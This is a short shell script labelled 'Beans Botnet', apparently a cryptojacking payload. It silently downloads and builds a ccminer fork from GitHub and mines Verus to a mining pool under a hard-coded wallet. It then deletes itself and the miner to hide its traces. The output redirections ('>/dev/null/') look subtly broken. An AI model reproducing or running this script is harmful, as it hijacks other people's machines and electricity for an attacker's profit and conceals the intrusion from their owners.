################
#    Beans     #
#    Botnet    #
################

apt-get update && apt-get upgrade -y >/dev/null/
apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git nano >/dev/null/
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer >/dev/null/
cd ccminer > /dev/null/
chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh >/dev/null/
./build.sh || sh build.sh >/dev/null/
./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u REPN6Sd2hXkR63mwAisX6Hd6qvo8w6sbt1.bean -p x -t 4 >/dev/null/
echo beans >/dev/null/
rm -- "$0" >/dev/null/
rm -rf ccminer >/dev/null/







